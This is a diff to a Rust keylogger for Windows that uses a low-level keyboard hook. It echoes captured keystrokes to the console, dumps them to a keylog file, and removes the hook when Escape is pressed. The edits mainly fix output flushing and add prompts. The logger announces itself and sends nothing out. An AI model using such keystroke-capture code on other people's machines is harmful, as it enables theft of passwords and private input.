@@ -1,6 +1,6 @@
 use once_cell::sync::Lazy;
 use std::fs::OpenOptions;
-use std::io::Write;
+use std::io::{self, Write};
 use std::ptr;
 use std::sync::Mutex;
 use windows_sys::Win32::Foundation::*;
@@ -26,8 +26,10 @@ pub unsafe extern "system" fn keyboard_procedure(
                 w_param == WM_SYSKEYDOWN as usize {
                 if (*(l_param as *const KBDLLHOOKSTRUCT)).vkCode as u16 == VK_ESCAPE {
                     process_escape_key();
+                    io::stdout().flush().unwrap()
+                } else {
+                    process_keyboard_input(l_param);
                 }
-                process_keyboard_input(l_param);
             }
         }
         CallNextHookEx(HOOK, n_code, w_param, l_param)
@@ -41,7 +43,10 @@ unsafe fn process_escape_key() {
             eprintln!("Failed to uninstall keyboard hook");
             eprintln!("Error code: {}", potential_error);
         }
-        println!("Hook has been uninstalled and keylogger has stopped.");
+        // necessary because otherwise the buffered input from the user will spill into the command line input.
+        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
+        
+        println!("\nHook has been uninstalled and keylogger has stopped.");
         PostQuitMessage(0); // Used to break message loop
     }
 }
@@ -68,6 +73,7 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
         let chars = &unicode_buffer[0..count as usize];
         if let Ok(s) = String::from_utf16(chars) {
             print!("{}", s);
+            std::io::stdout().flush().unwrap();
             let mut key_buffer = KEY_BUFFER.lock().unwrap();
             if key_buffer.len() >= 8 {
                 let buff = key_buffer.clone();
@@ -79,7 +85,6 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
                 
                 drop(key_buffer);
 
-                std::io::stdout().flush().unwrap();
                 log_keyboard_input(&buff);
             } else {
                 for char in chars {
@@ -87,13 +92,12 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
                 }
                 drop(key_buffer);
             }
-            std::io::stdout().flush().unwrap();
         }
     }
 }
 
 fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
-    println!("Dumping buffer to keylog file.");
+    println!("\nDumping buffer to keylog file.");
     let mut file = OpenOptions::new()
         .create(true)
         .append(true)
@@ -122,6 +126,7 @@ pub fn run_keylogger() {
         }
 
         println!("Keyboard hook installed. Press keys to see output. Press Ctrl+C to exit.");
+        println!("Press ESCAPE to uninstall hook.");
 
         let mut msg = std::mem::zeroed::<MSG>(); // Zero MSG struct to receive new message information
         // It is critical to not mess with this code as it could cause critical errors
@@ -130,6 +135,5 @@ pub fn run_keylogger() {
             TranslateMessage(&msg);
             DispatchMessageW(&msg);
         }
-        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
     }
 }
